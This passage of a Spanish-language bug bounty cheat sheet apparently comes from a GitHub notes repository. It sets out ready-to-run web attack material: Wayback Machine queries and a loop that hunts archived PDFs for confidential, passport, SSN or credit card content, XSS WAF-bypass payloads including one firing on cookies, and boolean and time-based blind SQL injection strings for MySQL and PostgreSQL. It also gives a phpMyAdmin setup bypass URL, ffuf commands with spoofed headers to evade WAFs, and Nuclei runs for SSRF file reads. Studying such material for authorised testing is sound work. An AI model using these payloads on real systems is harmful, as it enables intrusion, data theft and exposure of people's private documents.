   curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.chatgpt.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > output.txt

   cat output.txt | grep .pdf
   cat output.txt | grep @gmail
   cat output.txt | grep @hotmail
   ```
   ```bash
   curl "https://web.archive.org/cdx/search/cdx?url=*.policybazaar.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|git|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|env|apk|msi|dmg|tmp|crt|pem|key|pub|asc)$" | tee output2.txt

   cat output2.txt| grep -Ea '\.pdf' | while read -r url; do curl -s "$url" | pdftotext - - | grep -Eaiq '(internal use only confidential|strictly private|personal & confidential|private|restricted|internal|not for distribution|do not share|proprietary|trade secret|classified|sensitive|bank statement|invoice|salary|contract|agreement|non disclosure|passport|social security|ssn|date of birth|credit card identity|id number|company confidential|staff only|management only|internal only|ccv)' && echo "$url"; done
   ```
3. Busqueda en Web archive. En el segundo cuadro de busqueda (ubicado mas abajo antes de los resultado) escribir las extensiones de los archivos que quieren buscar como por ejemplo: .pdf o .xls
   ```bash
   https://web.archive.org/web/*/domain.com/*
   ```  
-------------------------------------------------------------------------------------------------


# ***VII. Open Redirect in Web Apps***

`Open Redirect` es una falla de seguridad común que permite a los atacantes redirigir a los usuarios a sitios web maliciosos. Esta vulnerabilidad ocurre cuando una aplicación web acepta URL introducidas por el usuario sin la validación ni el control adecuado.

### 7.1. Usando plantilla favorita de Nuclei.
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/openRedirect.yaml -c 30
      ```
### 7.2. Usando Google Dorking
   - ```bash 
      python dorking.py
      Enter The Dork Search Query: site:.ru(inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uir= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= |  inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http= | inurl:&)
      Enter Total ....: all
      Do You Want to save...: y
      Enter Output Filename: openredirect

     cat openredirect | wc -l
     cat openredirect | gf redirect 
      ```

-------------------------------------------------------------------------------------------------


# ***VIII. WAF***

### 8.1. ***FFUZ***. comando para evitar WAFs y obtener buenos resultados en errores de divulgación de información.
   - ```bash 
      ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
      ```
### 8.2. ***XSS bypass WAF***.
   - ```bash 
      "><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
      "><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
      "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
      1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")</ScRiPt>
      "><input%0a%0atype="hidden"%0a%0aoncontentvisibilityautostatechange=confirm(/paulportanc/)%0d%0astyle=content-visibility:auto>
      "><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
      <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
      ```


-------------------------------------------------------------------------------------------------


# ***IX. Bases de Datos***

### 9.1. ***PHPMYADMIN***. Si encuentra alguna página phpmyadmin, simplemente omítala con la página de configuración de instalación Ejemplo: https://www.ejmplo.com/phpmyadmin/. Omisión pegar ***/setup/index.php/setup/index.php?page=servers&mods=test&id=test*** después de phpmyadmin/ La mayoría de las veces, debido a una mala configuración de seguridad, se abre la página de configuración principal, así que simplemente repórtelo al programa de recompensas y gane una buena cantidad de recompensa 
   - ```bash 
      https://www.ejemplo.com/media/phpmyadmin/setup/index.php/setup/index.php?page=servers&mods=test&id=test
      ```
### 9.2. ***SQL Injection***. Buscará directamente todos los subdominios basados ​​en **php**, **asp**, **jsp**, **jspx**, **aspx**. 
   - ```bash 
      subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
      subfinder -d ejemplo.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
      ```
   - Ejemplo: En el campo email_user='+||+(1)=(1)+LiMiT+1--+-$pwd=123
   - ```bash 
      '+||+(1)=(1)+LiMiT+1--+-
      ```
   - Ejemplo: GET http:....../order=nombre&sort=-1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
   - ```bash 
      -1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
      ```   
### 9.3. ***SQL Injection Blind MYSQL***.  
   - Ejemplo: En la cabecera GET
   - ```bash 
      -1+OR+IF(1%3d1,+(SELECT+1+FROM+(SELECT+SLEEP(MID(version(),1)))+AS+v),+0)
      ```
   - Ejemplo: search='OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
   - ```bash 
      'OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
      ```   
### 9.4. ***SQL Injection Blind PostgreSQL***.  
   - Ejemplo: GET /pagina.php?valor=(SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
   - ```bash 
      (SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
      ```
### 9.5. SQL Injection con extension Max HackBar
   - Ejemplo
   - ```bash 
      https://www.youtube.com/watch?v=KgLKI2oPDtw
      ```

   

-------------------------------------------------------------------------------------------------


# ***X. Plantillas Nuclei***

### 10.1. ***Open Redirect***. Es una vulnerabilidad en la que una aplicación web redirecciona de forma incorrecta a los usuarios a sitios que no son de confianza, lo que permite a los atacantes redirigir a las víctimas a sitios web maliciosos o de phishing.
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/openRedirect.yaml --retries 2
      ```
### 10.2. ***WP-Setup Disclosure***. Esta plantilla ayuda a identificar el archivo wp-admin/setup-config.php que puede exponer información confidencial, como credenciales. Suele clasificarse como una vulnerabilidad P1 en los programas de recompensas por errores.
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/wp-setup-config.yaml
      ```
### 10.3. ***Microsoft IIS Scanner***. La explotación de esta vulnerabilidad puede filtrar archivos que contienen información confidencial, como credenciales, archivos de configuración, scripts de mantenimiento y otros datos.
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/iis.yaml -c 30
      ```
     Después de descubrir esta vulnerabilidad, puede utilizar la herramienta ShortScan para identificar archivos y directorios confidenciales mediante este comando:
   - ```bash 
      shortscan https://dominio.com -F
      ```
### 10.4. ***Git Exposure***. La vulnerabilidad de exposición de .git ocurre cuando un directorio .git de un repositorio de Git o archivos de configuración se exponen accidentalmente a la red pública de Internet debido a servidores web mal configurados. Esto puede filtrar información confidencial, como el código fuente, el historial de confirmaciones y las credenciales, que los atacantes podrían aprovechar para obtener acceso no autorizado o identificar vulnerabilidades en el sistema.
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/gitExposed.yaml  
      ```
     A continuación, puede utilizar la herramienta Git Dumper para recuperar confirmaciones eliminadas y extraer detalles adicionales del repositorio Git.
     
### 10.5. ***CORS Misconfiguration***. La vulnerabilidad CORS (Cross-Origin Resource Sharing - intercambio de recursos de origen cruzado) se produce cuando una aplicación web permite de forma indebida solicitudes de dominios no confiables, lo que permite a los atacantes acceder a datos confidenciales o realizar acciones no autorizadas en nombre de los usuarios. Esto puede suceder si la configuración de CORS es demasiado permisiva y permite que sitios web maliciosos interactúen con la aplicación..
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/cors.yaml  
      ```
     Para verificar cors puedes usar el repetidor burpsuite o usar el siguiente comando CURL.
   - ```bash 
      curl -H 'Origin: http://ejemplo.com' -I https://dominio.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'  
      ```
   - ```bash 
      curl -H 'Origin: http://ejemplo.com' -I https://dominio.com/wp-json/  
      ```
### 10.6. ***Crendential Disclosure***. La divulgación de credenciales es la exposición de información confidencial, como contraseñas o claves API, a menudo debido a un almacenamiento o controles de acceso deficientes que conducen a un acceso no autorizado.
   - ```bash 
      cat dominios.txt | nuclei -t  /home/paulportanc/prsnl/credentials-disclosure-all.yaml -c 30  
      ```
### 10.7. ***Blind SSRF***. La SSRF ciega se produce cuando un atacante engaña a un servidor para que realice solicitudes a sistemas internos sin ver la respuesta. El atacante infiere que el ataque tuvo éxito basándose en pistas indirectas, como el tiempo o los errores. Es riesgoso, ya que puede exponer recursos internos.
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/blind-ssrf.yaml -c 30 -dast  
      ```
     Después de detectar Blind SSRF, use la plantilla SSRF de respuesta para acceder a /etc/passwd y otros archivos internos del servidor. Para verificar, use el siguiente comando CURL, le mostrará el archivo passwd del sistema, etc.
   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/response-ssrf.yaml --retries 2 --dast
      ```
### 10.8. ***SQL injection***. La inyección SQL es un tipo de ataque en el que un atacante inserta un código SQL malicioso en una consulta, lo que le permite manipular o acceder a una base de datos de manera no autorizada. Esta plantilla ayudará a detectar la inyección SQL basada en errores.
   - ```bash 
      cat domains.txt | nuclei -t /home/paulportanc/prsnl/errorsqli.yaml -dast  
      ```
### 10.9. ***Swagger-Ui XSS***. Swagger XSS ocurre cuando un atacante inyecta scripts maliciosos en Swagger UI, una herramienta para la documentación de API. Esto puede provocar acciones no autorizadas, robo de datos o desfiguración de la interfaz de la API que afecten a los usuarios que interactúan con ella.
   - ```bash 
      subfinder -d dominio.txt -all -slent | httpx-toolkit -path /swagger-api/ -sc -content-length -mc 200 
      ```
### 10.10. ***CRLF injection***. La inyección CRLF es cuando un atacante inserta caracteres de nueva línea maliciosos en campos de entrada, lo que potencialmente le permite manipular encabezados, crear divisiones de respuestas HTTP o inyectar contenido malicioso en aplicaciones web. Después de encontrar esto, puede confirmar la vulnerabilidad utilizando Burp Suite o simplemente usando el comando CURL.

   - ```bash 
      cat dominios.txt | nuclei -t /home/paulportanc/prsnl/cRlf.yaml -rl 50 -c 30 
      ```
### 10.11. ***Phishing***. Detectar sitios web de phishing.

   - ```bash 
      nuclei -l websites_Possible_Phishing -tags phishing -itags phishing
      ```
### 10.12. ***WordPress***. Plantilla para wordpress de divulgación que contiene información tan senstive que cuentan como P1. Sólo tiene que ejecutar esta plantilla en todos los subdominios bbp (bug bounty program). El template **wp-setup-config.yaml** se encuentra en el repositorio..

   - ```bash 
      echo 'https://speedtest.ejemplo.com/' | nuclei -t nuclei-template/wp-setup-config.yaml
      subfinder -d example.com -all | httpx-toolkit | nuclei -t nuclei-template/wp-setup-config.yaml
      ```
### 10.13. ***AWS***. Detectar configuraciones incorrectas y vulnerabilidades en nube (especificamente en AWS, detecta buckets de S3 e instancias EC2 mal configurados). Y Control de un bucket de S3

   - ```bash 
      nuclei -config ~/nuclei-templates/profiles/aws-cloud-config.yml -s critical,high --silent
      echo EJEMPLO.COM | cariddi | grep js | tee js_files | httpx -mc 200 | nuclei -tags aws,amazon
      ```
-------------------------------------------------------------------------------------------------

# ***XI. DNS***

### 11.1. ***PureDNS***. Resolver/forzar mediante DNS.
   - ```bash 
      puredns bruteforce best-dns-wordlist.txt dominio.com -r resolvers.txt -w dns | httpx -mc 200 -o subdomain_output.txt 
      ```
     
-------------------------------------------------------------------------------------------------



# ***Extensiones para Bug Hunting***
   
| Extensiones | Descripción | URL | Browser | Logo | By |
| --- | --- | --- | --- | --- | --- |
| `EndPointer` | Analiza y extrae endpoints de aplicaciones web | https://addons.mozilla.org/en-US/firefox/addon/endpointer/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/e261f3e348bb9ba18e12fb671180633de99f6a38/extension-img/EndPointer.png "EndPointer") | `Interloper Security Group` |
| `Ripper Web Content - Capture Metadata Content` | Extensión que analiza y extrae metadatos del contenido encontrado en la web | https://chromewebstore.google.com/detail/ripper-web-content-captur/popfhajlkgkiecedhefhifccngogomgh | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/65ce6804513b18d14d764f6351772190ecfae667/extension-img/RipperWebContent.png "Ripper Web Content") | `Miguel Segovia` |
| `User-Agent Switcher for Chrome` | Puede cambiar de forma rápida y sencilla entre cadenas de agente de usuario | https://chromewebstore.google.com/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/d2e5fd3473d58a0b7571c7cc8494be32ce51cc72/extension-img/User-Agent.png "User-Agent") | `Google 1600 Amphitheatre Pkwy Mountain View, CA 94043 US` |
| `HackBar` | Una extensión del navegador para pruebas de penetración, aparece en la opción de inspeccionar una URL  | https://chromewebstore.google.com/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/efe4c1a0ea1a19b9bc64f9f9a4add2fdd0b500d4/extension-img/HackBar.png "HackBar") | `0140454` |
| `Max HacKBar` | Una extensión del navegador para pruebas de penetración, aparece en la opción de inspeccionar una URL  | https://addons.mozilla.org/es/firefox/addon/maxs-hackbar/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/efe4c1a0ea1a19b9bc64f9f9a4add2fdd0b500d4/extension-img/MaxHacKBar.png "Max HacKBar") | `Maxlab` |
| `Wappalyzer` | Esta extensión le ayudará a encontrar qué tecnología se ejecuta en el sitio web | https://addons.mozilla.org/es/firefox/addon/wappalyzer/ o https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg | Firefox y Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/917e1efb909ad70a84ba5c8346eeb81963c86fc8/extension-img/Wappalyzer.png "Wappalyzer") | `Wappalyzer` |
| `WaybackURL` | Obtener todas las URL que Wayback Machine conoce para un dominio. Es un plugin tipo FFUZZ | https://addons.mozilla.org/en-US/firefox/addon/waybackurl/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/a09c8a99375d5899d7d8a8eb93688053f53d8520/extension-img/WaybackURL.png "WaybackURL") | `Hossein Shourabi` |
| `Temp Mail` | Esta extensión se utiliza para el servicio de correo temporal de forma rápida y sencilla | https://addons.mozilla.org/en-US/firefox/addon/temp-mail/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/70aa57238a65069a9b451b6f720b77dfe685882a/extension-img/TempMail.png "Temp Mail") | `Privatix` |
| `Hunter io` | Encuentra direcciones de correo electrónico en segundos. Esta extensión se utiliza para buscar todos los correos electrónicos del sitio web y es mejor utilizarla para enviar informes sobre programas públicos | https://addons.mozilla.org/en-US/firefox/addon/hunterio/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/0c7a6f078d5e219c922475787193d2c818211b68/extension-img/Hunter.png "Hunter") | `Hunter` |
| `Trufflehog` | Esta extensión le ayuda a encontrar claves API ocultas en sitios web | https://addons.mozilla.org/en-US/firefox/addon/trufflehog/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/f8d0e85f718f55ca4582258064e9c18bb2254864/extension-img/Trufflehog.png "Trufflehog") | `Xhunt3r` |
| `FoxyProxy Standard` | Esta extensión es para usar burpsuite o cualquier otra aplicación de captura de proxy (mitm) | https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/daa2f5e5c8e9738d2ba9ee56fe8a5b611f6bd963/extension-img/FoxyProxyStandard.png "FoxyProxy Standard") | `Eric Jung, erosman` |
| `HackTools` | Esta extensión le brinda toda la información útil para probar el sitio de manera sencilla | https://addons.mozilla.org/en-US/firefox/addon/hacktools/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/2a04f9b8b4b08392d3d8dd13d8ebc8280ebd3d0a/extension-img/HackTools.png "HackTools") | `Riadh B. & Ludovic C.` |
| `CookieManager - Cookie Editor` | Esta es la mejor extensión para el editor de cookies y también le indicará si el sitio es http únicamente o si el indicador de seguridad está configurado o no. Otra alternativa https://cookie-editor.com/ | https://addons.mozilla.org/en-US/firefox/addon/edit-cookie/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/524832dbd7ec9f7f344b315f6b20d1e5b953d626/extension-img/CookieManager.png "CookieManager") | `Joue` |
| `Disable WebRTC` | Esta extensión es el mejor uso para proteger su IP VPN del webrtc exposer | https://addons.mozilla.org/en-US/firefox/addon/happy-bonobo-disable-webrtc/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/2e090e13b2b8e5430436c9f575434c063dd2c897/extension-img/DisableWebRTC.png "Disable WebRTC") | `Chris Antaki` |
| `Link Gopher` | Esta extensión se utiliza para recuperar todos los dominios y enlaces de sitios web y resultados de Google | https://addons.mozilla.org/en-US/firefox/addon/link-gopher/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/1153f8ff9adbe275dcca47ef3233d071ac813f26/extension-img/LinkGopher.png "Link Gopher") | `Andrew Ziem` |
| `FindSomething` | Esta extensión se utiliza para encontrar posibles parámetros ocultos o claves secretas | https://addons.mozilla.org/en-US/firefox/addon/findsomething/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/b4bf22c8a12f128317ec6a1edb1930808627c52a/extension-img/FindSomething.png "FindSomething") | `residual.laugh` |
| `DotGit` | Esta extensión le ayudará a encontrar archivos .git en la divulgación de información p1 del sitio web | https://addons.mozilla.org/en-US/firefox/addon/dotgit/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/6028d403e29ede095d52b42f1869229f93d0386e/extension-img/DotGit.png "DotGit") | `davtur` |
| `Open Multiple URLs` | Esta extensión se utiliza para abrir varios sitios a la vez | https://addons.mozilla.org/en-US/firefox/addon/open-multiple-urls/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/50fd0dfcfa85496a3aa1796a8bc09f66bd5f40c5/extension-img/OpenMultipleURLs.png "Open Multiple URLs") | `ht` |
| `uBlock Origin` | Esta extensión es mejor para bloquear anuncios o rastreadores irritantes en sitios | https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/c2626d596a78233a08de407e8228b4ca0598800f/extension-img/uBlockOrigin.png "uBlock Origin") | `Raymond Hill` |
| `Dark Reader` | Esta extensión protegerá mejor sus ojos durante la noche mientras caza | https://addons.mozilla.org/en-US/firefox/addon/darkreader/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/3e1e24cd1e0e813b48d363057cd334420fb01a01/extension-img/DarkReader.png "Dark Reader") | `Dark Reader Ltd` |
| `User-Agent Switcher` | Esta extensión se utiliza para cambiar de agente de usuario y es mejor para probar el sitio con muchos agentes de usuario | https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/3f04196e833cb1ef093f4b0c5adb007a51002c00/extension-img/User-AgentSwitcher.png "User-Agent Switcher") | `ntninja` |
| `retire.js` | Esta extensión le indica todas las bibliotecas de JavaScript vulnerables | https://addons.mozilla.org/en-US/firefox/addon/retire-js/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/00c80a1bd8c03314a46d2a8551f99246dafc5fa3/extension-img/retire.js.png "retire.js") | `Francesco De Stefano` |
| `Shodan` | El complemento Shodan le indica dónde está alojado el sitio web (país, ciudad), quién es el propietario de la IP y qué otros servicios/puertos están abiertos | https://addons.mozilla.org/es/firefox/addon/shodan-addon/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/c80ff9b136cdb3a8bc787fd6ea818841fe948703/extension-img/Shodan.png "Shodan") | `Shodan` |
| `EXIF Viewer Pro` | Esta extensión le brindará acceso directo a los datos exif de cualquier foto, sin necesidad de visitar ningún sitio. Es útil para buscar errores, si encuentra algún sitio, siempre verifique la carga de la imagen de perfil con esta extensión si hay datos exif como la ubicación geográfica presentes en él. repórtelos o aumente el impacto incorporando xss y rce en esa imagen. | https://chromewebstore.google.com/detail/exif-viewer-pro/mmbhfeiddhndihdjeganjggkmjapkffm | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/e7f0cf2bfe15f96b1c0baf047bbe764e465fbd27/extension-img/EXIFViewerPro.png "EXIF Viewer Pro") | `exifviewers.com` |
| `BackLine Scanner` | Esta no es una extensión si no un marcador. Para usaro debes hacer clic en el marcador una vez que estes en el sitio web para que realice el scan| Pasos: 1.Add bookmark 2.Name: BlockLine Find Endpoint 3.URL: pegar todo el codigo de abajo | Cualquiera | https://github.com/paulportanc/BugBounty/blob/dc110cf40ae04566fd4175590a870a5e25a936e8/bookmarkscript.txt |  |


-------------------------------------------------------------------------------------------------


# ***Anonimato con Nipe***
   
   `NIPE` es un programa que usa la red Tor como puerta de enlace predeterminada del usuario, enrutando todo el tráfico en la red Tor, que a menudo se usa para brindar privacidad y anonimato. Permanecer en el anonimato es una excelente manera de protegerse de todo tipo de vigilancia..
   
## 6.1.Instalación
   - Paso 1: Colocarse en el /home/kali y crear el directorio nipe e ingresar.
     ```bash
     mkdir nipe
      cd nipe
     ```
   - Paso 2: Luego, clonar este repositorio desde GitHub.
     ```bash
     git clone https://github.com/htrgouvea/nipe
     ```     
   - Paso 3: Dentro habrá otro directorio llamado nipe, ingresar a el.
     ```bash
     cd nipe
     ```  
   - Paso 4: Ejecutar el siguiente comando para instalar las bibliotecas y dependencias.
     ```bash
     sudo cpan install Try::Tiny Config::Simple JSON
     ```  
   - Paso 5: Usar el siguiente comando para instalar las dependencias de Nipe o un script de Perl.
     ```bash
     sudo perl nipe.pl install
     ```  
    
## 6.2.Uso (ejecutar desde /home/kali/nipe/nipe)
   - Paso 1: Verificar el estado de nipe, escriba el siguiente comando. Y verás que el estado actual es deshabilitado. Aparecerá de la siguiente manera: El estado está deshabilitado y la IP es su IP Pública actual. La IP se puede validar ingreando al sitio https://www.whatismyip.com/.
     ```bash
     sudo perl nipe.pl status

      ┌──(kali㉿kali)-[~/nipe/nipe]
      └─$ sudo perl nipe.pl status

       [+] Status: false 
       [+] Ip: 38.25.30.53
     ```
   - Paso 2: Para iniciar el servicio Nipe. Luego ejecutar el comando status. El estado está en TRUE y la IP es una IP Pública de otro pais.
     ```bash
      sudo perl nipe.pl start

      ┌──(kali㉿kali)-[~/nipe/nipe]
      └─$ sudo perl nipe.pl status
        
       [+] Status: true 
       [+] Ip: 185.220.102.8
     ```     
   - **Nota** es probable que a la primera te aparezca el siguiente error: *[!] ERROR: sorry, it was not possible to establish a connection to the server.*  Si en caso de aparecer el siguiente error solo debes detener el estado con stop y luego volver a iniciar un par de veces hasta que en estado sea TRUE.     

> [!Warning]
> 
> # DISCLAIMER
> Este documento está destinado únicamente para fines educativos y de hacking ético. Sólo debe utilzarse para probar sistemas de su propiedad o para los que tenga permiso explícito para probar. El uso no autorizado de sitios web o sistemas de terceros sin consentimiento es ilegal y poco ético.
